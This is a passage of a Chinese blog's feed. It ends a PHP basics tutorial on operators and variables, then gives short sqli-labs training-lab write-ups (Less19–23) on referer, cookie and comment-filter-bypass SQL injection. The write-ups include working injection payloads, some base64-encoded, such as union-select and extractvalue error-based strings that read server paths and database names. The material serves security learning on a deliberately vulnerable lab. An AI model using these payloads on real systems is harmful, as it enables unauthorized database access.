title="其他运算符"></a>其他运算符</h3><table><thead><tr><th>运算符</th><th>描述</th><th>示例</th></tr></thead><tbody><tr><td>? :</td><td>三元运算符，可以提供简单的逻辑判断。</td><td>$a&lt;$b?$c=1:$c=0</td></tr><tr><td>``</td><td>反引号(``)是执行运算符，PHP将尝试将反引号中的内容作外壳命令来执行，并将其输入信息返回</td><td>$a=`ls -al`</td></tr><tr><td>@</td><td>错误控制运算符，当将其放置在一个PHP表达式之前，该表达式可能产生的任何错误信息都被忽略掉。</td><td>@表达式</td></tr><tr><td>=&gt;</td><td>数组下标指定符号，通过此符号指定数组的键与值。</td><td>键=&gt;值</td></tr><tr><td>-&gt;</td><td>对象成员访问符号，访问对象中的成员属性或成员方法。</td><td>对象-&gt;成员</td></tr><tr><td>instanceof</td><td>类型运算符，用来测定一个给定的对象是否来自指定的对象类。</td><td>对象instanceof类名</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var_dump(false ? &#39;1&#39; : &#39;2&#39;);</span><br><span class="line">$a&#x3D;&#96;ls -al&#96;</span><br><span class="line">var_dump(@$_GET[&#39;id&#39;]);</span><br><span class="line">$info &#x3D; array(&#39;key&#39;&#x3D;&gt;&#39;1&#39;);</span><br><span class="line">$info &#x3D; new Object();</span><br><span class="line">$info-&gt;one();</span><br></pre></td></tr></table></figure><h3 id="运算符的优先级"><a href="#运算符的优先级" class="headerlink" title="运算符的优先级"></a>运算符的优先级</h3><table><thead><tr><th><strong>优先级</strong></th><th><strong>结合方向</strong></th><th><strong>运算符</strong></th><th><strong>附加信息</strong></th></tr></thead><tbody><tr><td>1</td><td>无结合</td><td>clone、new</td><td>clone 和 new</td></tr><tr><td>2</td><td>从右向左</td><td>**</td><td>算术运算符</td></tr><tr><td>3</td><td>从右向左</td><td>++、–、~、(int)、(float)、(string)、(array)、(object)、(bool)、@</td><td>类型、递增／递减、错误控制</td></tr><tr><td>4</td><td>无结合</td><td>instanceof</td><td>类型</td></tr><tr><td>5</td><td>从右向左</td><td>!</td><td>逻辑运算符</td></tr><tr><td>6</td><td>从左向右</td><td>*、/、%</td><td>算术运算符</td></tr><tr><td>7</td><td>从左向右</td><td>+、-、.</td><td>算术运算符和字符串运算符</td></tr><tr><td>8</td><td>从左向右</td><td>&lt;&lt;、&gt;&gt;</td><td>位运算符</td></tr><tr><td>9</td><td>无结合</td><td>&lt;、&lt;=、&gt;、&gt;=</td><td>比较运算符</td></tr><tr><td>10</td><td>无结合</td><td>==、!=、===、!==、&lt;&gt;、&lt;=&gt;</td><td>比较运算符</td></tr><tr><td>11</td><td>从左向右</td><td>&amp;</td><td>位运算符和引用</td></tr><tr><td>12</td><td>从左向右</td><td>^</td><td>位运算符</td></tr><tr><td>13</td><td>从左向右</td><td>&#124;</td><td>位运算符</td></tr><tr><td>14</td><td>从左向右</td><td>&amp;&amp;</td><td>逻辑运算符</td></tr><tr><td>15</td><td>从左向右</td><td>&#124;&#124;</td><td>逻辑运算符</td></tr><tr><td>16</td><td>从右向左</td><td>??</td><td>null 合并运算符</td></tr><tr><td>17</td><td>从左向右</td><td>? :</td><td>三元运算符</td></tr><tr><td>18</td><td>从右向左</td><td>=、+=、-=、*=、**=、/=、.=、%=、&amp;=、&#124;=、^=、&lt;&lt;=、&gt;&gt;=</td><td>赋值运算符</td></tr><tr><td>19</td><td>从左向右</td><td>and</td><td>逻辑运算符</td></tr><tr><td>20</td><td>从左向右</td><td>xor</td><td>逻辑运算符</td></tr><tr><td>21</td><td>从左向右</td><td>or</td><td>逻辑运算符</td></tr></tbody></table><h2 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h2><ol><li>表达式是 <code>PHP</code> 最重要的基石。在 <code>PHP</code> 中，几乎所写的任何东西都是一个表达式。简单但却最精确的定义一个表达式的方式就是<strong>任何有值的东西</strong>。</li><li>最基本的表达式形式是常量和变量。当键入<code>$a = 5</code>。</li><li>稍微复杂的表达式例子就是函数。 </li><li>其他还有运算符与操作数构成的也成表达式。如：比较表达式<code>$a&gt;5</code>、<code>$a==5</code>。 </li></ol><h2 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h2><p>有时候使用可变变量名是很方便的。就是说，一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。 例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; &#39;hello&#39;;&#x2F;&#x2F;普通变量</span><br><span class="line">$$a &#x3D; &#39;world&#39;;&#x2F;&#x2F;可变变量</span><br><span class="line">echo &quot;$a $&#123;$a&#125;&quot;;&#x2F;&#x2F;输出：hello world</span><br><span class="line">echo &quot;$a $hello&quot;;&#x2F;&#x2F;输出：hello world</span><br></pre></td></tr></table></figure><h2 id="变量的引用赋值"><a href="#变量的引用赋值" class="headerlink" title="变量的引用赋值"></a>变量的引用赋值</h2><ol><li>引用操作符<code>&amp;</code>可以在关联赋值中使用，就像一个别名，使得变量都指向了内存的相同地址。</li><li>通过<code>unset($a)</code>重置变量与内存的关联<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a&#x3D;5;</span><br><span class="line">$b&#x3D;&amp;$a;</span><br><span class="line">echo $b;&#x2F;&#x2F;输出5</span><br><span class="line">$a&#x3D;7;</span><br><span class="line">echo $b;&#x2F;&#x2F;输出7</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;PHP语言标记&quot;&gt;&lt;a href=&quot;#PHP语言标记&quot; class=&quot;headerlink&quot; title=&quot;PHP语言标记&quot;&gt;&lt;/a&gt;PHP语言标记&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;以&lt;code&gt;&amp;lt;?php&lt;/code&gt;开始&lt;code&gt;?&amp;gt;&lt;/code&gt;结束标记是标准风格，这是&lt;code&gt;PHP&lt;/code&gt;推荐使用的标记风格。&lt;/li&gt;
&lt;li&gt;以&lt;code&gt;&amp;lt;script language=&amp;quot;php&amp;quot;&amp;gt;&lt;/code&gt;开始和&lt;code&gt;&amp;lt;/script&amp;gt;&lt;/code&gt;结束是长风格标记，这种标记最长，总是可用的，但我们并不常用。&lt;/li&gt;
&lt;li&gt;以&lt;code&gt;&amp;lt;?&lt;/code&gt;开始和以&lt;code&gt;?&amp;gt;&lt;/code&gt;结束标记是简短风格的标记，是最简单的，但是系统管理员偶尔会禁用掉它，因为它会干扰&lt;code&gt;XML&lt;/code&gt;文档的声明。只用通过&lt;code&gt;php.ini&lt;/code&gt;配置文件中的指令&lt;code&gt;short_open_tag&lt;/code&gt;打开后就可以使用。&lt;/li&gt;
&lt;li&gt;以&lt;code&gt;&amp;lt;%&lt;/code&gt;开始和以&lt;code&gt;%&amp;gt;&lt;/code&gt;结束标记是&lt;code&gt;ASP&lt;/code&gt;风格的标记，可以在&lt;code&gt;php.ini&lt;/code&gt;配置文件设定中启用了&lt;code&gt;asp_tags&lt;/code&gt;选项就可以使用它（默认是禁用的），习惯了&lt;code&gt;ASP&lt;/code&gt;风格的可以使用它。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;PHP程序注释&quot;&gt;&lt;a href=&quot;#PHP程序注释&quot; class=&quot;headerlink&quot; title=&quot;PHP程序注释&quot;&gt;&lt;/a&gt;PHP程序注释&lt;/h2&gt;&lt;p&gt;PHP支持C、C＋＋和Shell脚本风格的注释，如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;#x2F;&amp;#x2F;... ...	单行注释&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#x2F;* ... ... *&amp;#x2F; 多行注释 		（注意：不能嵌套）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# ... ... 	脚本注释&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;PHP中的运算符&quot;&gt;&lt;a href=&quot;#PHP中的运算符&quot; class=&quot;headerlink&quot; title=&quot;PHP中的运算符&quot;&gt;&lt;/a&gt;PHP中的运算符&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;运算符是可以通过给出的一或多个值（用编程行话来说，表达式）来产生另一个值（因而整个结构成为一个表达式）的东西。所以可以认为函数或任何会返回一个值（例如 print）的结构是运算符，而那些没有返回值的（例如 echo）是别的东西。 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;有三种类型的运算符：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;一元运算符&lt;/strong&gt;:只运算一个值，例如 &lt;code&gt;!&lt;/code&gt;（取反运算符）或 &lt;code&gt;++&lt;/code&gt;（加一运算符）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;二元运算符&lt;/strong&gt;:有两个操作数，PHP支持的大多数运算符都是这种。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;三元运算符&lt;/strong&gt;：&lt;code&gt;? :&lt;/code&gt;。它应该被用来根据一个表达式在另两个表达式中选择一个，而不是用来在两个语句或者程序路线中选择。把整个三元表达式放在扩号里是个很好的主意。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;算术运算符&quot;&gt;&lt;a href=&quot;#算术运算符&quot; class=&quot;headerlink&quot; title=&quot;算术运算符&quot;&gt;&lt;/a&gt;算术运算符&lt;/h3&gt;</summary>
    
    
    
    <category term="PHP基础" scheme="https://hzktester.top/categories/PHP%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="PHP基础" scheme="https://hzktester.top/tags/PHP%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs靶场Less23（过滤了注释符的绕过）</title>
    <link href="https://hzktester.top/posts/13aa761f.html"/>
    <id>https://hzktester.top/posts/13aa761f.html</id>
    <published>2020-10-20T07:48:00.000Z</published>
    <updated>2020-10-20T09:21:51.043Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Less23"><a href="#Less23" class="headerlink" title="Less23"></a>Less23</h2><p>本关对<code>id</code>参数过滤了<code>#</code>和<code>--</code>的处理。但是还可以使用闭合的方式来注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,@@datadir,&#39;3</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020102009.png" alt="image"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Less23&quot;&gt;&lt;a href=&quot;#Less23&quot; class=&quot;headerlink&quot; title=&quot;Less23&quot;&gt;&lt;/a&gt;Less23&lt;/h2&gt;&lt;p&gt;本关对&lt;code&gt;id&lt;/code&gt;参数过滤了&lt;code&gt;#&lt;/code&gt;和&lt;code&gt;--&lt;/code&gt;的处理。但是还可以使用闭合的方式来注入&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;?id&amp;#x3D;-1&amp;#39; union select 1,@@datadir,&amp;#39;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020102009.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
</summary>
    
    
    
    <category term="sqli-labs靶场" scheme="https://hzktester.top/categories/sqli-labs%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="sqli-labs" scheme="https://hzktester.top/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs靶场Less20、21、22(cookie注入)</title>
    <link href="https://hzktester.top/posts/eb6bd74b.html"/>
    <id>https://hzktester.top/posts/eb6bd74b.html</id>
    <published>2020-10-20T06:59:00.000Z</published>
    <updated>2020-10-20T09:21:51.042Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Less20"><a href="#Less20" class="headerlink" title="Less20"></a>Less20</h2><p>从源代码中我们可以看到 <code>cookie</code> 从 <code>username</code> 中获得值后，当再次刷新时，会从 <code>cookie</code> 中读<br>取 <code>username</code>，然后进行查询。<br>登录成功后，我们修改 <code>cookie</code>，再次刷新时，这时候 <code>sql</code> 语句就会被修改了</p><p>先使用正确的账号密码登录一次。使用burp抓取第二个数据包。修改<code>cookie</code>的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020102006.png" alt="image"></p><h2 id="Less21"><a href="#Less21" class="headerlink" title="Less21"></a>Less21</h2><p>与Less20处理流程一样，但是对cookie进行了<code>base64</code>加密。利用Less20的方法，但是需要将<code>payload</code>进行<code>base64</code>编码处理（这里对uname进行了<code>(&#39;uname&#39;)</code>处理）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4nKWFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IEBAYmFzZWRpciksMHg3ZSkpIw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020102007.png" alt="image"></p><h2 id="Less22"><a href="#Less22" class="headerlink" title="Less22"></a>Less22</h2><p>本关和Less20、Less21是一致的，但是<code>uname</code>进行了<code>&quot;uname&quot;</code>的处理<br>构造<code>payload</code>:<code>admin&quot;and extractvalue(1,concat(0x7e,(select database()),0x7e))#</code></p><p><code>payload</code>进行<code>base64</code>编码后，修改<code>cookie</code>再进行提交</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4iYW5kIGV4dHJhY3R2YWx1ZSgxLGNvbmNhdCgweDdlLChzZWxlY3QgZGF0YWJhc2UoKSksMHg3ZSkpIw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020102008.png" alt="image"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Less20&quot;&gt;&lt;a href=&quot;#Less20&quot; class=&quot;headerlink&quot; title=&quot;Less20&quot;&gt;&lt;/a&gt;Less20&lt;/h2&gt;&lt;p&gt;从源代码中我们可以看到 &lt;code&gt;cookie&lt;/code&gt; 从 &lt;code&gt;username&lt;/code&gt; 中获得值后，当再次刷新时，会从 &lt;code&gt;cookie&lt;/code&gt; 中读&lt;br&gt;取 &lt;code&gt;username&lt;/code&gt;，然后进行查询。&lt;br&gt;登录成功后，我们修改 &lt;code&gt;cookie&lt;/code&gt;，再次刷新时，这时候 &lt;code&gt;sql&lt;/code&gt; 语句就会被修改了&lt;/p&gt;
&lt;p&gt;先使用正确的账号密码登录一次。使用burp抓取第二个数据包。修改&lt;code&gt;cookie&lt;/code&gt;的值&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;#39; and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020102006.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Less21&quot;&gt;&lt;a href=&quot;#Less21&quot; class=&quot;headerlink&quot; title=&quot;Less21&quot;&gt;&lt;/a&gt;Less21&lt;/h2&gt;&lt;p&gt;与Less20处理流程一样，但是对cookie进行了&lt;code&gt;base64&lt;/code&gt;加密。利用Less20的方法，但是需要将&lt;code&gt;payload&lt;/code&gt;进行&lt;code&gt;base64&lt;/code&gt;编码处理（这里对uname进行了&lt;code&gt;(&amp;#39;uname&amp;#39;)&lt;/code&gt;处理）&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;YWRtaW4nKWFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IEBAYmFzZWRpciksMHg3ZSkpIw&amp;#x3D;&amp;#x3D;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020102007.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Less22&quot;&gt;&lt;a href=&quot;#Less22&quot; class=&quot;headerlink&quot; title=&quot;Less22&quot;&gt;&lt;/a&gt;Less22&lt;/h2&gt;</summary>
    
    
    
    <category term="sqli-labs靶场" scheme="https://hzktester.top/categories/sqli-labs%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="sqli-labs" scheme="https://hzktester.top/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs靶场Less-19(referer注入)</title>
    <link href="https://hzktester.top/posts/588aed09.html"/>
    <id>https://hzktester.top/posts/588aed09.html</id>
    <published>2020-10-20T06:34:00.000Z</published>
    <updated>2020-10-20T09:21:51.039Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Less19"><a href="#Less19" class="headerlink" title="Less19"></a>Less19</h2><p>本关和Less18基本是一致的，只不过是<code>referer</code>处存在注入</p><p>使用burp抓包修改<code>referer</code></p><p><img src="https://qiniu.hzktester.top/tp2020102005.png" alt="image"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Less19&quot;&gt;&lt;a href=&quot;#Less19&quot; class=&quot;headerlink&quot; title=&quot;Less19&quot;&gt;&lt;/a&gt;Less19&lt;/h2&gt;&lt;p&gt;本关和Less18基本是一致的，只不过是&lt;code&gt;referer&lt;/code&gt;处存在注入&lt;/p&gt;
&lt;p&gt;使用burp抓包修改&lt;code&gt;referer&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020102005.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
</summary>
    
    
    
    <category term="sqli-labs靶场" scheme="https://hzktester.top/categories/sqli-labs%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="sqli-labs" scheme="https://hzktester.top/tags/sqli-labs/"/>
    
  </entry>
  
</feed>
